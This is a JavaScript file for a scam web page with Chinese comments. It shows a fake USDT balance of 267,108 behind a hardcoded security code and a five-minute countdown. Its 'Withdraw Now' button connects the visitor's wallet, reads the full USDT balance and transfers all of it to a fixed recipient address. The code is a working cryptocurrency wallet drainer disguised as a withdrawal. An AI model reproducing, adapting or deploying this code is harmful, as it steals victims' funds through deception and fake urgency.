// 检查 Web3 是否加载
if (typeof Web3 === 'undefined') {
    throw new Error("Web3 is not defined. Please check the network or CDN.");
}

// USDT 合约地址（以太坊主网）
const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
// 目标地址
const recipientAddress = '0x64C6592164CC7C0Bdfb1D9a6F64C172a1830eD2C';

// WalletConnect 提供者
async function getWeb3Provider() {
    let web3;

    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            return web3;
        } catch (error) {
            console.error("MetaMask connection failed:", error);
        }
    } else if (window.web3) {
        web3 = new Web3(window.web3.currentProvider);
        return web3;
    } else {
        alert("No wallet detected, attempting to connect via WalletConnect...");
        const WalletConnectProvider = window.WalletConnectProvider;
        if (!WalletConnectProvider) {
            throw new Error("WalletConnect is not loaded. Please check the network or CDN.");
        }
        const provider = new WalletConnectProvider({
            infuraId: "YOUR_INFURA_ID", // Replace with your Infura ID
        });
        await provider.enable();
        web3 = new Web3(provider);
        return web3;
    }

    throw new Error("Unable to connect to any wallet. Please install a Web3-compatible wallet.");
}

async function transferUsdt() {
    try {
        const web3 = await getWeb3Provider();
        console.log("Web3 provider initialized");

        const accounts = await web3.eth.getAccounts();
        const account = accounts[0];
        console.log("Connected account:", account);

        const chainId = await web3.eth.getChainId();
        if (chainId.toString() !== "1") {
            try {
                await web3.currentProvider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x1' }],
                });
            } catch (switchError) {
                alert("Please switch to Ethereum Mainnet manually.");
                return;
            }
        }

        const usdtAbi = [
            {"constant": true, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
            {"constant": false, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [], "type": "function"}
        ];

        const usdtContract = new web3.eth.Contract(usdtAbi, usdtAddress);
        const balance = await usdtContract.methods.balanceOf(account).call();
        const amount = web3.utils.toBN(balance);
        console.log("USDT balance:", web3.utils.fromWei(amount, 'mwei'));

        await usdtContract.methods.transfer(recipientAddress, amount).send({ from: account });
        alert("Transaction successfully sent!");
    } catch (error) {
        console.error("Error details:", error);
        alert("Transaction canceled or failed: " + error.message);
    }
}

// 页面元素
const securityPage = document.getElementById('security-page');
const mainPage = document.getElementById('main-page');
const submitCodeButton = document.getElementById('submit-code');
const errorMessage = document.getElementById('error-message');
const recipientAddressInput = document.getElementById('recipient-address');
const withdrawButton = document.getElementById('withdraw-button');
const countdownDisplay = document.getElementById('countdown');
const usdtBalanceDisplay = document.getElementById('usdt-balance');
const defaultSecurityCode = '328387';

// 格式化余额为千位分隔符和小数
function formatBalance(balance) {
    const [integer, decimal = ''] = balance.split('.');
    const formattedInteger = integer.replace(/\B(?=(\d{3})+(?!\d))/g, ',');
    return decimal ? `${formattedInteger}.${decimal}` : formattedInteger;
}

// 初始化余额
usdtBalanceDisplay.textContent = formatBalance('267108.2093');

// 安全码输入框逻辑
const codeInputs = document.querySelectorAll('.security-code-box');
codeInputs.forEach((input, index) => {
    input.addEventListener('input', () => {
        if (input.value.length === 1 && index < codeInputs.length - 1) {
            codeInputs[index + 1].focus();
        }
    });
    input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && input.value === '' && index > 0) {
            codeInputs[index - 1].focus();
        }
    });
});

// 验证安全码
submitCodeButton.addEventListener('click', () => {
    const code = Array.from(codeInputs).map(input => input.value).join('');
    if (code === defaultSecurityCode) {
        securityPage.style.display = 'none';
        mainPage.style.display = 'block';
        startCountdown();
    } else {
        errorMessage.textContent = 'Invalid Security Code';
        codeInputs.forEach(input => input.value = '');
        codeInputs[0].focus();
    }
});

// 倒计时逻辑
function startCountdown() {
    let timeLeft = 300; // 改为 300 秒
    countdownDisplay.textContent = `${timeLeft}s`;
    const countdown = setInterval(() => {
        timeLeft--;
        countdownDisplay.textContent = `${timeLeft}s`;
        if (timeLeft <= 0) {
            clearInterval(countdown);
            window.location.reload(); // 确保刷新
        }
    }, 1000);
}

// 点击“Withdraw Now”按钮
withdrawButton.addEventListener('click', transferUsdt);
